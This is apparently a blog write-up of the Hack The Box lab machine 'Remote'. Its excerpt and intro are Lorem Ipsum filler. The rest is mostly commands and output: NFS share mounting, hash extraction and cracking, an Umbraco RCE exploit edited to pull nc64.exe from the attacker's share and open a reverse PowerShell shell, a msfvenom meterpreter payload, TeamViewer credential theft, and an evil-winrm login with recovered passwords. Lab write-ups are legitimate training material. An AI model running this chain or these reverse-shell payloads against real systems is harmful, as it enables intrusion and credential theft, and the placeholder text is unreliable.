---
layout: single
title: Remote - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-05-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-remote/remote_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-remote/remote_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/remote# nmap -Pn -sC -sV -n 10.10.10.180
    PORT     STATE SERVICE       VERSION
    21/tcp   open  ftp           Microsoft ftpd
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst:
    |_  SYST: Windows_NT
    80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Home - Acme Widgets
    111/tcp  open  rpcbind?
    | rpcinfo:
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/tcp6  rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  2,3,4        111/udp6  rpcbind
    |   100003  2,3         2049/udp   nfs
    |   100003  2,3         2049/udp6  nfs
    |   100003  2,3,4       2049/tcp   nfs
    |   100003  2,3,4       2049/tcp6  nfs
    |   100005  1,2,3       2049/tcp   mountd
    |   100005  1,2,3       2049/tcp6  mountd
    |   100005  1,2,3       2049/udp   mountd
    |   100005  1,2,3       2049/udp6  mountd
    |   100021  1,2,3,4     2049/tcp   nlockmgr
    |   100021  1,2,3,4     2049/tcp6  nlockmgr
    |   100021  1,2,3,4     2049/udp   nlockmgr
    |   100021  1,2,3,4     2049/udp6  nlockmgr
    |   100024  1           2049/tcp   status
    |   100024  1           2049/tcp6  status
    |   100024  1           2049/udp   status
    |_  100024  1           2049/udp6  status
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    2049/tcp open  rpcbind
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_smb2-time: Protocol negotiation failed (SMB2)


  DIRB:
  + http://10.10.10.180/about-us (CODE:200|SIZE:5441)
  + http://10.10.10.180/blog (CODE:200|SIZE:5001)
  + http://10.10.10.180/Blog (CODE:200|SIZE:5001)
  + http://10.10.10.180/contact (CODE:200|SIZE:7880)
  + http://10.10.10.180/Contact (CODE:200|SIZE:7880)
  + http://10.10.10.180/home (CODE:200|SIZE:6703)
  + http://10.10.10.180/Home (CODE:200|SIZE:6703)
  + http://10.10.10.180/install (CODE:302|SIZE:126)
  + http://10.10.10.180/intranet (CODE:200|SIZE:3323)
  + http://10.10.10.180/master (CODE:500|SIZE:3420)
  + http://10.10.10.180/people (CODE:200|SIZE:6739)
  + http://10.10.10.180/People (CODE:200|SIZE:6739)
  + http://10.10.10.180/person (CODE:200|SIZE:2741)
  + http://10.10.10.180/product (CODE:500|SIZE:3420)
  + http://10.10.10.180/products (CODE:200|SIZE:5328)
  + http://10.10.10.180/Products (CODE:200|SIZE:5328)
  + http://10.10.10.180/umbraco (CODE:200|SIZE:4040)

  NIKTO:
  + Server banner has changed from '' to 'Microsoft-IIS/10.0' which may suggest a WAF, load balancer or proxy is in place
  + /umbraco/ping.aspx: Umbraco ping page found


2. Browsing the webpage we find a few employees, add them to a user list. Both /umbraco and /install forwards to a login page.
   Rpcclient without user and/or anonymous user is not possible.
   Anonymous FTP is allowed, however there's nothing on the share.

   Looking on the rpcbind-ports however we can see some enumerated nfs-shares showing. We can further enumterate this using
   nmap scripts (nfs-ls, nfs-showmount & nfs-statfs)

   root@p3:/opt/htb/machines/remote# nmap --script nfs-* 10.10.10.180
    ..
    111/tcp  open  rpcbind
    | nfs-ls: Volume /site_backups
    |   access: Read Lookup NoModify NoExtend NoDelete NoExecute
    | PERMISSION  UID         GID         SIZE   TIME                 FILENAME
    | rwx------   4294967294  4294967294  4096   2020-02-23T18:35:48  .
    | ??????????  ?           ?           ?      ?                    ..
    | rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
    | rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
    | rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
    | rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
    | rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
    | rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
    | rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
    | rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
    |_
    | nfs-showmount:
    |_  /site_backups
    | nfs-statfs:
    |   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
    |_  /site_backups  31119356.0  12170588.0  18948768.0  40%   16.0T        1023


3. Create a new folder and mount the directory site_backups to review it's content.
    root@p3:/opt/htb/machines/remote# mount -t nfs 10.10.10.180:/site_backups tmpMount/
    root@p3:/opt/htb/machines/remote# ls -al tmpMount/
    total 123
    drwx------ 2 nobody 4294967294  4096 Feb 23 19:35 .
    drwxr-xr-x 3 root   root        4096 Apr 23 16:05 ..
    drwx------ 2 nobody 4294967294    64 Feb 20 18:16 App_Browsers
    drwx------ 2 nobody 4294967294  4096 Feb 20 18:17 App_Data
    drwx------ 2 nobody 4294967294  4096 Feb 20 18:16 App_Plugins
    drwx------ 2 nobody 4294967294    64 Feb 20 18:16 aspnet_client
    drwx------ 2 nobody 4294967294 49152 Feb 20 18:16 bin
    drwx------ 2 nobody 4294967294  8192 Feb 20 18:16 Config
    drwx------ 2 nobody 4294967294    64 Feb 20 18:16 css
    -rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx
    -rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asax
    drwx------ 2 nobody 4294967294  4096 Feb 20 18:16 Media
    drwx------ 2 nobody 4294967294    64 Feb 20 18:16 scripts
    drwx------ 2 nobody 4294967294  8192 Feb 20 18:16 Umbraco
    drwx------ 2 nobody 4294967294  4096 Feb 20 18:16 Umbraco_Client
    drwx------ 2 nobody 4294967294  4096 Feb 20 18:16 Views
    -rwx------ 1 nobody 4294967294 28539 Feb 20 06:57 Web.config


4. Enumerate the directory and we find Umbraco.sdf. Using strings we find users and their password hash.

    root@nidus:/opt/htb/machines/remote/tmpMount# find . -iname umbraco*
      ..
      ./App_Data/Umbraco.sdf

    root@nidus:/opt/htb/machines/remote/tmpMount/App_Data# strings Umbraco.sdf
      Administrator admin default en-US
      Administrator admin default en-US b22924d5-57de-468e-9df4-0961cf6aa30d
      Administrator admin b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"} en-US f8512f97-cab1-4a4b-a49f-0a2054c47a1d
      admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"} admin@htb.local en-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
      admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"} admin@htb.local en-US82756c26-4321-4d27-b429-1b5c7c4f882f
      smith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"} smith@htb.local en-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
      ssmith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"} smith@htb.local en-US7e39df83-5e64-4b93-9702-ae257a9b9749
      ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"} ssmith@htb.local en-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32


5. Use hashcat to crack the SHA1 hash of user admin@htb.local

    root@nidus:/opt/htb/machines/remote# hashcat -a0 -m100 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
      ..
      Status...........: Cracked
      ..

    root@nidus:/opt/htb/machines/remote# cat cracked.txt
      b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese


6. We are now able to login to the portal, 10.10.10.180/umbraco, with found credentials. A quick search for "Umbraco" on google tells us that it has a Remote Code Execution vuln.
   Download the script from ExploitDB and modify it to first return a ping. Once we get a ping back, we can change the code ('string cmd' and 'proc.StartInfo.FileName') to get a reverse shell.

   root@nidus:/opt/htb/machines/remote# cat 46153.py
    ..
    string cmd = "//10.10.14.2/pub-share/nc64.exe 10.10.14.2 4488 -e powershell"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
    proc.StartInfo.FileName = "powershell.exe";
    ..


    root@nidus:/opt/htb/machines/remote# rlwrap nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.2] from (UNKNOWN) [10.10.10.180] 49694
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\windows\system32\inetsrv> whoami
        whoami
        iis apppool\defaultapppool

      PS C:\Users\Public> type user.txt
        type user.txt
          439732ceaf451f5ed3f240011174e757



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerate the boxes services and we find a vulnerable TeamViewer (7) service.
    PS C:\Users> tasklist /SVC
      tasklist /SVC

      Image Name                     PID Services
      ========================= ======== ============================================
      ..
      TeamViewer_Service.exe        3080 TeamViewer7



2. Googling about TeamViewer7 exploits we find a msf module that finds storde credentials and crack them. To use msf modules we need a meterpreter session so start by creating a meterpreter payload and trigger a reverse by editing the first Umbraco python vuln.

    root@nidus:/opt/htb/machines/remote# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4499 -f exe > rev-meterpreter.exe
    root@nidus:/opt/htb/machines/remote# cat meterpreter.py
      ..
      string cmd = "//10.10.14.2/pub-share/rev-meterpreter.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
      proc.StartInfo.FileName = "powershell.exe";
      ..

    root@nidus:/opt/htb/machines/remote# msfdb run
    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf5 exploit(multi/handler) > set lhost 10.10.14.2
    msf5 exploit(multi/handler) > set lport 4499
    msf5 exploit(multi/handler) > run

    root@nidus:/opt/htb/machines/remote# python meterpreter.py
      ..
      [*] Meterpreter session 1 opened (10.10.14.2:4499 -> 10.10.10.180:49710) at 2020-05-07 15:05:31 +0200

    meterpreter >

3. Copy the module (https://whynotsecurity.com/blog/teamviewer/) and paste it in /root/.msf4/modules

    root@nidus:~/.msf4/modules# cp /opt/htb/machines/remote/remote-tv.rb /root/.msf4/modules/post/windows/gather/credentials/
    root@nidus:~/.msf4/modules# ls -al /root/.msf4/modules/post/windows/gather/credentials/
      total 16
      drwxr-xr-x 2 root root 4096 May  7 14:57 .
      drwxr-xr-x 3 root root 4096 May  7 14:56 ..
      -rw-r--r-- 1 root root 4523 May  7 14:57 remote-tv.rb

    Background the meterpreter session and update the database.
    meterpreter > background
      [*] Backgrounding session 1...
    msf5 exploit(multi/handler) > updatedb
      [*] exec: updatedb

4. Use the custom TeamViewer module to search for stored passwords.

    msf5 exploit(multi/handler) > search teamviewer

      Matching Modules
      ================

         #  Name                                                  Disclosure Date  Rank    Check  Description
         -  ----                                                  ---------------  ----    -----  -----------
         0  post/windows/gather/credentials/teamviewer_passwords                   normal  No     Windows Gather TeamViewer Passwords


    msf5 exploit(multi/handler) > use post/windows/gather/credentials/teamviewer_passwords
    msf5 post(windows/gather/credentials/teamviewer_passwords) > options

      Module options (post/windows/gather/credentials/teamviewer_passwords):

         Name          Current Setting  Required  Description
         ----          ---------------  --------  -----------
         SESSION                        yes       The session to run this module on.
         WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer

    msf5 post(windows/gather/credentials/teamviewer_passwords) > set session 1
    msf5 post(windows/gather/credentials/teamviewer_passwords) > run

      [*] Finding TeamViewer Passwords on REMOTE
      [+] Found Unattended Password: !R3m0te!
      [+] Passwords stored in: /root/.msf4/loot/20200507151315_default_10.10.10.180_host.teamviewer__218524.txt
      [*] <---------------- | Using Window Technique | ---------------->
      [*] TeamViewer's language setting options are ''
      [*] TeamViewer's version is ''
      [-] Unable to find TeamViewer's process
      [*] Post module execution completed


5. Use evil-winrm to grab root.txt

    root@nidus:/opt/htb/machines/remote# evil-winrm -i 10.10.10.180 -u Administrator -p '!R3m0te!'
      *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
        e68c6abb4d764732be88aaed8f733990



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

TeamViewer Exploit
  https://whynotsecurity.com/blog/teamviewer/

Import MSF-module
  https://medium.com/@pentest_it/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d
